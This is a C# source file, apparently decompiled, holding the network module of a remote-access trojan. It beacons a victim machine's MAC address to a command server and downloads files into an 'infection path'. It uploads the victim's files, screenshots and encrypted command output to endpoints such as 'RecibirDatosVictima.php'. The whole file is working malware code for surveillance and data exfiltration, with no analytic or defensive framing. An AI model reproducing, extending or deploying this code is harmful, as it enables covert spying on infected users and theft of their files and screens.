using System;
using System.Collections.Specialized;
using System.Net;
using System.Web;

namespace n3ux;

internal class Network
{
	public static string Domain = "";

	public static string XML = "";

	public static string MAC = "";

	public static bool Online()
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Domain);
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			httpWebRequest.Abort();
			return httpWebResponse.StatusCode == HttpStatusCode.OK;
		}
		catch
		{
			return false;
		}
	}

	public static void UpdateState(string systemVersion)
	{
		WebClient webClient = new WebClient();
		string uriString = Domain + "/actualizarEstadoMaquina.php?m=" + HttpUtility.UrlEncode(MAC) + "&s=" + HttpUtility.UrlEncode(systemVersion);
		webClient.DownloadString(new Uri(uriString));
	}

	public static string DownloadFile(string url)
	{
		string text = url.Split(new char[1] { '/' })[^1];
		string text2 = OS.InfectionPath() + "\\" + text;
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(url, text2);
			return text2;
		}
		catch
		{
			return text2;
		}
	}

	public static void SendFile(string path, string command, string uniqueID)
	{
		string value = File.ToBase64(path);
		string value2 = "." + path.Split(new char[1] { '.' })[^1];
		path = path.Replace("/", "\\");
		string[] array = path.Split(new char[1] { '\\' });
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection.Add("m", MAC);
		nameValueCollection.Add("comando", command);
		nameValueCollection.Add("id", uniqueID);
		nameValueCollection.Add("formato", value2);
		nameValueCollection.Add("nombre", array[^1].Remove(array[^1].IndexOf(value2)));
		nameValueCollection.Add("respuesta", value);
		nameValueCollection.Add("firmaSHA1", Crypto.getSignature(path, "SHA1"));
		nameValueCollection.Add("firmaMD5", Crypto.getSignature(path, "MD5"));
		WebClient webClient = new WebClient();
		webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
		webClient.UploadValues(Domain + "/RecibirArchivo.php", nameValueCollection);
	}

	public static void SendImage()
	{
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection.Add("respuesta", OS.CaptureScreen());
		nameValueCollection.Add("maquina", MAC);
		WebClient webClient = new WebClient();
		webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
		webClient.UploadValues(Domain + "/RecibirImagen.php", nameValueCollection);
	}

	public static void SendInformation(string info, string command, string uniqueID, int lastPacket)
	{
		string text = "";
		info = info.Replace("\\", "\\\\");
		info = info.Replace("á", "&aacute;");
		info = info.Replace("é", "&eacute;");
		info = info.Replace("í", "&iacute;");
		info = info.Replace("ó", "&oacute;");
		info = info.Replace("ú", "&uacute;");
		info = info.Replace("ñ", "&ntilde;");
		if (uniqueID == "")
		{
			uniqueID = "0";
		}
		text = Domain + "/RecibirDatosVictima.php?comando=" + command + "&respuesta=" + HttpUtility.UrlEncode(Crypto.EncryptRijndael(info)) + "&m=" + HttpUtility.UrlEncode(MAC) + "&id=" + HttpUtility.UrlEncode(uniqueID) + "&fin=" + HttpUtility.UrlEncode(lastPacket.ToString());
		WebClient webClient = new WebClient();
		webClient.DownloadString(new Uri(text));
	}
}
